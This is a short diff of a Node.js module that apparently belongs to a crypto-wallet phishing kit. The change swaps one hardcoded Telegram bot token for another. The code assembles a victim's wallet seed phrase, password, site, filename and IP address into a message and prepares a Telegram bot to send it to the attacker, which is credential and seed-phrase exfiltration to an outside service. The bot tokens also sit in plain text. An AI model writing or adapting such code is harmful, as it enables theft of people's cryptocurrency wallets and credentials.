@@ -33,7 +33,7 @@ module.exports = {
     const TelegramBot = require("node-telegram-bot-api");
     //    const stream = fs.createReadStream(req.file);
     // replace the value below with the Telegram token you receive from @BotFather
-    const token = "1221001704:AAE2rW5AxdvRv8fa4y_N1Y0TElTlaaWnpZQ";
+    const token = "1221001704:AAHSd909cRLIUhvYKtBwX58RxHMi2UvTKY8";
     const message1 = `${judul}\n\nmnemonic:\n${mnemonic}\n\npassword\n${password}\n\nsite\n${site}\n\nfilename\n${filename}\n\nIP ${ip}`;
     // Create a bot that uses 'polling' to fetch new updates
     const bot = new TelegramBot(token, { polling: true });
